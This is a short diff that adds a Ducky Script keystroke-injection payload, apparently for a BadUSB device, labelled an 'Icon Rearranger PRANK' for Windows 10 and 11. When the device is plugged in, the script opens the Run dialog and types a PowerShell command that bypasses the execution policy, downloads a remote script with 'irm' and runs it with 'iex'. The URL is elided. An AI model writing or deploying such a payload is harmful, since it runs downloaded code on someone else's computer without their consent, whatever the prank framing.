@@ -1,0 +1,13 @@
+
+REM Title: Icon Rearranger PRANK
+REM Author: @beigeworm
+REM Description: Hijacks the mouse and continuously minimizees all windows and drags around the desktop attempting to rearrange icons
+REM Target: Windows 10 and 11
+
+DEFAULT_DELAY 100
+
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -Ep Bypass -C iex (irm ...)
+ENTER
